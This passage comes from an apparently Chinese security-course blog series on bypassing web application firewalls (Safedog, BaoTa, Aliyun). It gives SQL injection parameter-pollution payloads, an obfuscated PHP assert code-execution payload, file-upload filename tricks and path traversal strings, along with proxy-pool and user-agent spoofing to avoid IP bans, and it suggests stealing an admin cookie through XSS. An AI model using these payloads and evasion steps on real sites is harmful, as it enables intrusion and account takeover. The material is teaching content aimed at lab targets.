class="headerlink" title="#上传参数名解析明确哪些东西能修改？"></a>#上传参数名解析明确哪些东西能修改？</h3><p>Content-Disposition：一般可更改</p><p>name：表单参数值，不能更改</p><p>filename：文件名，可以更改</p><p>Content-Type：文件MIME，视情况更改</p><h3 id="XSS跨站"><a href="#XSS跨站" class="headerlink" title="#XSS跨站"></a>#XSS跨站</h3><p>利用XSStrike绕过 加上–timeout或–proxy配合代理池绕过cc&amp;Fuzz</p><h3 id="其他集合"><a href="#其他集合" class="headerlink" title="#其他集合"></a>#其他集合</h3><p>RCE：</p><p>加密加码绕过？算法可逆？关键字绕过？提交方法？各种测试！</p><p>txt&#x3D;$y&#x3D;str_replace(‘x’,’’,’pxhpxinxfo()’);assert($y);&amp;submit&#x3D;%E6%8F%90%E4%BA%A4</p><p>文件包含：没什么好说的就这几种</p><p>..\  ….&#x2F; ...\等</p><p><img src="/../images/Day80-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-HPP%E6%B1%A1%E6%9F%93-%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93-%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE/0.png" alt="img"></p><p><img src="/../images/Day80-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-HPP%E6%B1%A1%E6%9F%93-%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93-%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE/0-16797249630459.png" alt="img"></p><p><img src="/../images/Day80-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-HPP%E6%B1%A1%E6%9F%93-%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93-%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE/-Tcu7_wDteVVAZXvo13Erw.png" alt="img"></p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>​                ➢ 安全狗-SQL注入&amp;文件上传-知识点</p><p>​                ➢ 安全狗-文件包含&amp;代码执行-知识点</p><p>​                ➢ BT&amp;Aliyun-SQL注入&amp;文件上传-知识点</p><p>​                ➢ BT&amp;Aliyun-文件包含&amp;代码执行-知识点</p></blockquote><h4 id="安全狗-SQL注入-amp-文件上传-知识点"><a href="#安全狗-SQL注入-amp-文件上传-知识点" class="headerlink" title="#安全狗-SQL注入&amp;文件上传-知识点"></a>#安全狗-SQL注入&amp;文件上传-知识点</h4><p>SQL注入 <a href="https://www.cnblogs.com/cute-puli/p/11146625.html">https://www.cnblogs.com/cute-puli/p/11146625.html</a></p><h5 id="关键字替换"><a href="#关键字替换" class="headerlink" title="关键字替换"></a>关键字替换</h5><p><a href="http://192.168.0.100:8081/sqlilabs/Less-2/?id=1">http://192.168.0.100:8081/sqlilabs/Less-2/?id=1</a> like 1正常</p><p><a href="http://192.168.0.100:8081/sqlilabs/Less-2/?id=1">http://192.168.0.100:8081/sqlilabs/Less-2/?id=1</a> like 12 报错</p><h5 id="更换提交方式：（前提是支持两种GET、POST提交方式）"><a href="#更换提交方式：（前提是支持两种GET、POST提交方式）" class="headerlink" title="更换提交方式：（前提是支持两种GET、POST提交方式）"></a>更换提交方式：（前提是支持两种GET、POST提交方式）</h5><p>POST id&#x3D;-1 union select 1,2,3–+</p><h5 id="模拟文件上传-传递数据"><a href="#模拟文件上传-传递数据" class="headerlink" title="模拟文件上传 传递数据"></a>模拟文件上传 传递数据</h5><p><img src="/../images/Day80-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-HPP%E6%B1%A1%E6%9F%93-%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93-%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE/image-20230325182051676.png" alt="image-20230325182051676"></p><h5 id="分块传输：更改数据请求格式-（其实没什么卵用，只有post形式的参数才可以用）"><a href="#分块传输：更改数据请求格式-（其实没什么卵用，只有post形式的参数才可以用）" class="headerlink" title="分块传输：更改数据请求格式 （其实没什么卵用，只有post形式的参数才可以用）"></a>分块传输：更改数据请求格式 （其实没什么卵用，只有post形式的参数才可以用）</h5><p><a href="https://github.com/c0ny1/chunked-coding-converter">https://github.com/c0ny1/chunked-coding-converter</a></p><h5 id="HPP参数污染：id-x3D-1-x2F-amp-id-x3D-1-20union-20select-201-2-3-23-x2F"><a href="#HPP参数污染：id-x3D-1-x2F-amp-id-x3D-1-20union-20select-201-2-3-23-x2F" class="headerlink" title="HPP参数污染：id&#x3D;1&#x2F;**&amp;id&#x3D;-1%20union%20select%201,2,3%23*&#x2F;"></a>HPP参数污染：id&#x3D;1&#x2F;**&amp;id&#x3D;-1%20union%20select%201,2,3%23*&#x2F;</h5><p><img src="/../images/Day80-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-HPP%E6%B1%A1%E6%9F%93-%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93-%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE/image-20230325182543919.png" alt="image-20230325182543919"></p><p><img src="/../images/Day80-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-HPP%E6%B1%A1%E6%9F%93-%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93-%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE/image-20230325182902618.png" alt="image-20230325182902618"></p><p>所以执行以后正常，绕过</p><p><img src="/../images/Day80-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-HPP%E6%B1%A1%E6%9F%93-%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93-%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE/image-20230325182932824.png" alt="image-20230325182932824"></p><h5 id="文件上传：换行解析-amp-垃圾溢出-amp-00干扰-amp-x3D-符号干扰-amp-参数模拟"><a href="#文件上传：换行解析-amp-垃圾溢出-amp-00干扰-amp-x3D-符号干扰-amp-参数模拟" class="headerlink" title="文件上传：换行解析&amp;垃圾溢出&amp;%00干扰&amp;&#x3D;符号干扰&amp;参数模拟"></a>文件上传：换行解析&amp;垃圾溢出&amp;%00干扰&amp;&#x3D;符号干扰&amp;参数模拟</h5><p>1、filename&#x3D;a.php</p><p>2、filename&#x3D;”a.php</p><p>3、filename&#x3D;”a.php%00”</p><p>4、垃圾数据;filename&#x3D;”a.php”</p><p>5、无限filename;filename&#x3D;”a.php”（行不通）</p><p>6、filename&#x3D;&#x3D;”a.php”</p><p>7、filename&#x3D;”name&#x3D;’uploadfile.php”</p><p>8、filename&#x3D;”Content-Disposition: form-data.php”</p><p>9、filename&#x3D;&#x3D;”a.ph</p><p>p”</p><p>1、filename&#x3D;a.php（没加双引号会误认为a.php也是和filename一样，都是参数）</p><p><img src="/../images/Day80-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-HPP%E6%B1%A1%E6%9F%93-%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93-%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE/image-20230325195044281.png" alt="image-20230325195044281"></p><p>4、垃圾数据;filename&#x3D;”a.php”</p><p><img src="/../images/Day80-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-HPP%E6%B1%A1%E6%9F%93-%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93-%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE/image-20230325195712452.png" alt="image-20230325195712452"></p><p>写在name前面也可以</p><p><img src="/../images/Day80-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-HPP%E6%B1%A1%E6%9F%93-%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93-%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE/image-20230325195836372.png" alt="image-20230325195836372"></p><p>6、filename&#x3D;&#x3D;”a.php”  （ 两个等于号三个都可以）</p><p><img src="/../images/Day80-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-HPP%E6%B1%A1%E6%9F%93-%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93-%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE/image-20230325195113245.png" alt="image-20230325195113245"></p><p>7、filename&#x3D;”name&#x3D;’uploadfile.php”</p><p><img src="/../images/Day80-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-HPP%E6%B1%A1%E6%9F%93-%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93-%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE/image-20230325200145419.png" alt="image-20230325200145419"></p><p>8、filename&#x3D;”Content-Disposition: form-data.php”</p><p><img src="/../images/Day80-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-HPP%E6%B1%A1%E6%9F%93-%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93-%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE/image-20230325200251654.png" alt="image-20230325200251654"></p><p>9、filename&#x3D;&#x3D;”a.ph</p><p>p”</p><p><img src="/../images/Day80-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-HPP%E6%B1%A1%E6%9F%93-%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93-%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE/image-20230325195304725.png" alt="image-20230325195304725"></p><p>换行后多出了0d +0a这是换行符</p><h4 id="安全狗-文件包含-amp-代码执行-知识点"><a href="#安全狗-文件包含-amp-代码执行-知识点" class="headerlink" title="#安全狗-文件包含&amp;代码执行-知识点"></a>#安全狗-文件包含&amp;代码执行-知识点</h4><p>安全狗没有对此进行过滤，因为无法识别是恶意的还是正常的操作</p><p><img src="/../images/Day80-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-HPP%E6%B1%A1%E6%9F%93-%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93-%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE/image-20230325200637973.png" alt="image-20230325200637973"></p><p>不拦截</p><p><img src="/../images/Day80-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-HPP%E6%B1%A1%E6%9F%93-%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93-%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE/image-20230325200651559.png" alt="image-20230325200651559"></p><h4 id="BT-amp-Aliyun-SQL注入-amp-文件上传-知识点"><a href="#BT-amp-Aliyun-SQL注入-amp-文件上传-知识点" class="headerlink" title="#BT&amp;Aliyun-SQL注入&amp;文件上传-知识点"></a>#BT&amp;Aliyun-SQL注入&amp;文件上传-知识点</h4><p>python sqlmap.py -u “<a href="http://test.xiaodi8.com/pikachu/vul/sqli/sqli_str.php?name=*&submit=%E6%9F%A5%E8%AF%A2">http://test.xiaodi8.com/pikachu/vul/sqli/sqli_str.php?name=*&amp;submit=%E6%9F%A5%E8%AF%A2</a>“ –random-agent –tamper&#x3D;rdog.py –proxy&#x3D;”<a href="http://tps118.kdlapi.com:15818/">http://tps118.kdlapi.com:15818</a>“</p><p>格式替换</p><h4 id="BT-amp-Aliyun-文件包含-amp-代码执行-知识点"><a href="#BT-amp-Aliyun-文件包含-amp-代码执行-知识点" class="headerlink" title="#BT&amp;Aliyun-文件包含&amp;代码执行-知识点"></a>#BT&amp;Aliyun-文件包含&amp;代码执行-知识点</h4><p>XSS绕过bt</p><p>项目地址：<a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a></p><p>python xsstrike.py -u “<a href="http://test.xiaodi8.com/pikachu/vul/xss/xss_reflected_get.php?message=1&submit=submit">http://test.xiaodi8.com/pikachu/vul/xss/xss_reflected_get.php?message=1&amp;submit=submit</a>“ –proxy</p><p>修改XSStrike里面的配置文件，添加代理池IP</p><p><img src="/../images/Day80-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-HPP%E6%B1%A1%E6%9F%93-%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93-%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE/image-20230325201841096.png" alt="image-20230325201841096"></p><p>python xsstrike.py -u “<a href="http://test.xiaodi8.com/pikachu/vul/xss/xss_reflected_get.php?message=1&submit=submit">http://test.xiaodi8.com/pikachu/vul/xss/xss_reflected_get.php?message=1&amp;submit=submit</a>“ –proxy （前面的+号表示注入成功的）</p><p><img src="/../images/Day80-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-HPP%E6%B1%A1%E6%9F%93-%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93-%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE/image-20230325202300002.png" alt="image-20230325202300002"></p><p>txt&#x3D;$y&#x3D;str_replace(‘x’,’’,’pxhpxinxfo()’);assert($y);</p><p><img src="/../images/Day80-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-HPP%E6%B1%A1%E6%9F%93-%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93-%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE/image-20230325201423938.png" alt="image-20230325201423938"></p><p>成功绕过</p><p><img src="/../images/Day80-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-HPP%E6%B1%A1%E6%9F%93-%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93-%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE/image-20230325201229237.png" alt="image-20230325201229237"></p><p>文件包含：没什么好说的就这几种</p><p>..\  ….&#x2F; ...\等</p><p>宝塔会拦截文件包含关键字，它不是拦截这个漏洞，而是拦截这个关键字</p><p><img src="/../images/Day80-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-HPP%E6%B1%A1%E6%9F%93-%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93-%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE/image-20230325200959428.png" alt="image-20230325200959428"></p><blockquote><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><h5 id="安全狗："><a href="#安全狗：" class="headerlink" title="安全狗："></a>安全狗：</h5><p>注入 xss 文件上传拦截</p><p>rce 文件包含 等其他不拦截</p><h5 id="宝塔："><a href="#宝塔：" class="headerlink" title="宝塔："></a>宝塔：</h5><p>注入 上传拦截</p><p>rce 文件包含 xss等其他不拦截</p><p>其中拦截的是关键字</p><h5 id="aliyun"><a href="#aliyun" class="headerlink" title="aliyun"></a>aliyun</h5><p>拦截的CC速度 和 后门 信息收集和权限维持阶段拦截</p><p>漏洞利用 他不拦截 默认的版本（升级版本没测试）</p></blockquote><p>宝塔xss测试过程中，它会拦截xss语句并且再日志记录下来触发了xss</p><p><img src="/../images/Day80-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-HPP%E6%B1%A1%E6%9F%93-%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93-%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE/image-20230325203652767.png" alt="image-20230325203652767"></p><p>所以尝试用xss平台得到xss语句，获取cookie，登录bt，从而实现管理网站</p><p><img src="/../images/Day80-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-HPP%E6%B1%A1%E6%9F%93-%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93-%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE/image-20230325203906451.png" alt="image-20230325203906451"></p><h5 id="WAF-gt-PHP环境"><a href="#WAF-gt-PHP环境" class="headerlink" title="WAF -&gt;PHP环境"></a>WAF -&gt;PHP环境</h5><h5 id="JAVA不支持，java一般内置过滤器，目前很少有waf"><a href="#JAVA不支持，java一般内置过滤器，目前很少有waf" class="headerlink" title="JAVA不支持，java一般内置过滤器，目前很少有waf"></a>JAVA不支持，java一般内置过滤器，目前很少有waf</h5><p><img src="/../images/Day80-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-HPP%E6%B1%A1%E6%9F%93-%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93-%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE/image-20230326000811596.png" alt="image-20230326000811596"></p>]]></content>
      
      
      <categories>
          
          <category> WAF攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day79 WAF攻防-漏洞发现&amp;协议&amp;代理池&amp;Goby&amp;Awvs&amp;Xray</title>
      <link href="/2023/03/23/Day79-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%90%86%E6%B1%A0-Goby-Awvs-Xray/"/>
      <url>/2023/03/23/Day79-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%90%86%E6%B1%A0-Goby-Awvs-Xray/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、Http&#x2F;s&amp;Sock5协议</p><p>2、Awvs&amp;Xray&amp;Goby代理</p><p>3、Proxifier进程代理使用</p><p>4、Safedog&amp;BT&amp;Aliyun防护</p><h4 id="在漏洞发现中，WAF会对三个方向进行过滤拦截："><a href="#在漏洞发现中，WAF会对三个方向进行过滤拦截：" class="headerlink" title="在漏洞发现中，WAF会对三个方向进行过滤拦截："></a>在漏洞发现中，WAF会对三个方向进行过滤拦截：</h4><h5 id="1、速度流量问题"><a href="#1、速度流量问题" class="headerlink" title="1、速度流量问题"></a>1、速度流量问题</h5><p>使用代理池</p><h5 id="2、工具的指纹被识别"><a href="#2、工具的指纹被识别" class="headerlink" title="2、工具的指纹被识别"></a>2、工具的指纹被识别</h5><p>改变工具的特有UA头，例如sqlmap，awvs等的UA头</p><h5 id="3、工具的检测Poc或Payload"><a href="#3、工具的检测Poc或Payload" class="headerlink" title="3、工具的检测Poc或Payload"></a>3、工具的检测Poc或Payload</h5><p>手工测试</p><p>换其他的工具进行测试  </p><p>AWVS转到burp结合xray组合拳，拦截数据包进行修改payload（这种方法实际不行，因为为了绕过流量过快要设置代理池，抓包又要设置代理，工具不能设置两个代理）</p><blockquote><p>演示案例：</p><p>​                ➢ Awvs漏扫-Safedog-白名单-内置</p><p>​                ➢ Awvs漏扫-BT&amp;Aliyun-代理池-内置</p><p>​                ➢ Xray漏扫-BT&amp;Aliyun-Proxifier-进程</p><p>​                ➢ Goby漏扫-BT&amp;Aliyun-Socket5-内置</p></blockquote><h4 id="Awvs漏扫-Sadedog-白名单-内置"><a href="#Awvs漏扫-Sadedog-白名单-内置" class="headerlink" title="#Awvs漏扫-Sadedog-白名单-内置"></a>#Awvs漏扫-Sadedog-白名单-内置</h4><h6 id="加入白名单扫描，防Safedog拉黑IP"><a href="#加入白名单扫描，防Safedog拉黑IP" class="headerlink" title="加入白名单扫描，防Safedog拉黑IP"></a>加入白名单扫描，防Safedog拉黑IP</h6><p>将UA头换成白名单</p><p>扫描到注入点而且速度没有被拦截，网址依然正常打开</p><p><img src="/../images/Day79-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%90%86%E6%B1%A0-Goby-Awvs-Xray/image-20230325122852179.png" alt="image-20230325122852179"></p><h4 id="Awvs漏扫-BT-amp-Aliyun-代理池-内置"><a href="#Awvs漏扫-BT-amp-Aliyun-代理池-内置" class="headerlink" title="#Awvs漏扫-BT&amp;Aliyun-代理池-内置"></a>#Awvs漏扫-BT&amp;Aliyun-代理池-内置</h4><h6 id="加入代理池扫描，防BT或Aliyun拉黑IP"><a href="#加入代理池扫描，防BT或Aliyun拉黑IP" class="headerlink" title="加入代理池扫描，防BT或Aliyun拉黑IP"></a>加入代理池扫描，防BT或Aliyun拉黑IP</h6><p>隧道代理，每请求一次都换一个ip</p><p><img src="/../images/Day79-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%90%86%E6%B1%A0-Goby-Awvs-Xray/image-20230325124339900.png" alt="image-20230325124339900"></p><p>把本地ip加入白名单就不用密码登录代理池了，百度搜ip就可以知道自己的ip，将AVWS使用代理池</p><p><img src="/../images/Day79-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%90%86%E6%B1%A0-Goby-Awvs-Xray/image-20230325124548020.png" alt="image-20230325124548020"></p><h4 id="Xray漏扫-BT-amp-Aliyun-Proxifier-进程"><a href="#Xray漏扫-BT-amp-Aliyun-Proxifier-进程" class="headerlink" title="#Xray漏扫-BT&amp;Aliyun-Proxifier-进程"></a>#Xray漏扫-BT&amp;Aliyun-Proxifier-进程</h4><h6 id="加入代理池扫描，防BT或Aliyun拉黑IP-1"><a href="#加入代理池扫描，防BT或Aliyun拉黑IP-1" class="headerlink" title="加入代理池扫描，防BT或Aliyun拉黑IP"></a>加入代理池扫描，防BT或Aliyun拉黑IP</h6><p>Xray本身不能设置代理池，只能通过工具，这里使用Proxifier</p><p><img src="/../images/Day79-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%90%86%E6%B1%A0-Goby-Awvs-Xray/image-20230325125102924.png" alt="image-20230325125102924"></p><p>代理规则</p><p><img src="/../images/Day79-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%90%86%E6%B1%A0-Goby-Awvs-Xray/image-20230325125305656.png" alt="image-20230325125305656"></p><p>即使本机ip被封了，使用代理池依旧可以访问</p><p><img src="/../images/Day79-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%90%86%E6%B1%A0-Goby-Awvs-Xray/image-20230325125430526.png" alt="image-20230325125430526"></p><h4 id="Goby漏扫-BT-amp-Aliyun-Socket5-内置"><a href="#Goby漏扫-BT-amp-Aliyun-Socket5-内置" class="headerlink" title="#Goby漏扫-BT&amp;Aliyun-Socket5-内置"></a>#Goby漏扫-BT&amp;Aliyun-Socket5-内置</h4><h6 id="加入代理池扫描，防BT或Aliyun拉黑IP-2"><a href="#加入代理池扫描，防BT或Aliyun拉黑IP-2" class="headerlink" title="加入代理池扫描，防BT或Aliyun拉黑IP"></a>加入代理池扫描，防BT或Aliyun拉黑IP</h6><p>SOCKS是一种网络传输协议，主要用于客户端与外网服务器之间通讯的中间传递。<br>根据OSI模型，SOCKS是会话层的协议，位于表示层与传输层之间。<br>使用TCP协议传输数据，因而不提供如传递 ICMP 信息之类的网络层网关服务</p><p>所以当使用nessus,goby这种还可以扫描系统漏洞的工具时，在proxifier上要使用socks代理</p><p><img src="/../images/Day79-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%90%86%E6%B1%A0-Goby-Awvs-Xray/image-20230325125725849.png" alt="image-20230325125725849"></p><p>goby上只有这两个代理设置，这样扫描可以扫描一些不走web协议的漏洞</p><p><img src="/../images/Day79-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%90%86%E6%B1%A0-Goby-Awvs-Xray/image-20230325130134665.png" alt="image-20230325130134665"></p><p>这个平台的代理池支持socks代理</p><p><img src="/../images/Day79-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%90%86%E6%B1%A0-Goby-Awvs-Xray/image-20230325130636663.png" alt="image-20230325130636663">sqlmap也可以设置代理池</p><p><img src="/../images/Day79-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%90%86%E6%B1%A0-Goby-Awvs-Xray/image-20230325135114937.png" alt="image-20230325135114937">但是被拦截了，因为识别到了sqlmap的专有指纹，修改UA头使用”–user-agent”，或者指定</p><p><img src="/../images/Day79-WAF%E6%94%BB%E9%98%B2-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%90%86%E6%B1%A0-Goby-Awvs-Xray/image-20230325134419011.png" alt="image-20230325134419011"></p>]]></content>
      
      
      <categories>
          
          <category> WAF攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day78 WAF攻防-菜刀&amp;冰蝎&amp;哥斯拉&amp;流量通讯&amp;特征绕过&amp;检测反制&amp;感知</title>
      <link href="/2023/03/23/Day78-WAF%E6%94%BB%E9%98%B2-%E8%8F%9C%E5%88%80-%E5%86%B0%E8%9D%8E-%E5%93%A5%E6%96%AF%E6%8B%89-%E6%B5%81%E9%87%8F%E9%80%9A%E8%AE%AF-%E7%89%B9%E5%BE%81%E7%BB%95%E8%BF%87-%E6%A3%80%E6%B5%8B%E5%8F%8D%E5%88%B6-%E6%84%9F%E7%9F%A5/"/>
      <url>/2023/03/23/Day78-WAF%E6%94%BB%E9%98%B2-%E8%8F%9C%E5%88%80-%E5%86%B0%E8%9D%8E-%E5%93%A5%E6%96%AF%E6%8B%89-%E6%B5%81%E9%87%8F%E9%80%9A%E8%AE%AF-%E7%89%B9%E5%BE%81%E7%BB%95%E8%BF%87-%E6%A3%80%E6%B5%8B%E5%8F%8D%E5%88%B6-%E6%84%9F%E7%9F%A5/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/Day78-WAF%E6%94%BB%E9%98%B2-%E8%8F%9C%E5%88%80-%E5%86%B0%E8%9D%8E-%E5%93%A5%E6%96%AF%E6%8B%89-%E6%B5%81%E9%87%8F%E9%80%9A%E8%AE%AF-%E7%89%B9%E5%BE%81%E7%BB%95%E8%BF%87-%E6%A3%80%E6%B5%8B%E5%8F%8D%E5%88%B6-%E6%84%9F%E7%9F%A5/5H3u13r2aFA9d9cPxOhY1A.png" alt="img"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、菜刀-流量&amp;通讯&amp;检测&amp;绕过</p><p>2、冰蝎-流量&amp;通讯&amp;检测&amp;绕过</p><p>3、哥斯拉-流量&amp;通讯&amp;检测&amp;绕过</p><h4 id="代码块-amp-传参数据-amp-工具指纹等-表面-amp-行为"><a href="#代码块-amp-传参数据-amp-工具指纹等-表面-amp-行为" class="headerlink" title="代码块&amp;传参数据&amp;工具指纹等(表面&amp;行为)"></a>代码块&amp;传参数据&amp;工具指纹等(表面&amp;行为)</h4><p>1、代码表面层免杀-ASP&amp;PHP&amp;JSP&amp;ASPX等</p><p>2、工具行为层免杀-菜刀&amp;蚁剑&amp;冰蝎&amp;哥斯拉等</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>WAF绕过主要集中在信息收集，漏洞发现，漏洞利用，权限控制四个阶段。</p><h3 id="补充点："><a href="#补充点：" class="headerlink" title="#补充点："></a>#补充点：</h3><h5 id="1、什么是WAF？"><a href="#1、什么是WAF？" class="headerlink" title="1、什么是WAF？"></a>1、什么是WAF？</h5><p>Web Application Firewall（web应用防火墙），一种公认的说法是“web应用防火墙通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为web应用提供保护的一款产品。</p><p>基本可以分为以下4种</p><h5 id="软件型WAF"><a href="#软件型WAF" class="headerlink" title="软件型WAF"></a>软件型WAF</h5><p>以软件的形式安装在服务器上面，可以接触到服务器上的文件，因此就可以检测服务器上是否有webshell，是否有文件被创建等。</p><h5 id="硬件型WAF"><a href="#硬件型WAF" class="headerlink" title="硬件型WAF"></a>硬件型WAF</h5><p>以硬件形式部署在链路中，支持多种部署方式。当串联到链路上时可以拦截恶意流量，在旁路监听模式时只记录攻击但是不进行拦截。</p><h5 id="云-WAF"><a href="#云-WAF" class="headerlink" title="云 WAF"></a>云 WAF</h5><p>一般以反向代理的形式工作，通过配置后，使对网站的请求数据优先经过WAF主机，在WAF主机对数据进行过滤后再传给服务器</p><h5 id="网站内置的WAF"><a href="#网站内置的WAF" class="headerlink" 